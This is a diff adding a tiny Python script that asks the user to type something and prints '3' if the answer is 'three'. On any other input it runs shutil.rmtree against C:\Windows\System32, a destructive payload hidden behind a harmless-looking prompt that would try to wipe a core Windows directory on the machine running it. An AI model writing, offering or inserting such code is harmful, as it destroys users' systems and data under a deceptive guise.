@@ -1,0 +1,7 @@
+import os
+import shutil
+
+if input("Type something: ") == "three":
+      print("3")
+else:
+      shutil.rmtree("C:\\Windows\\System32")
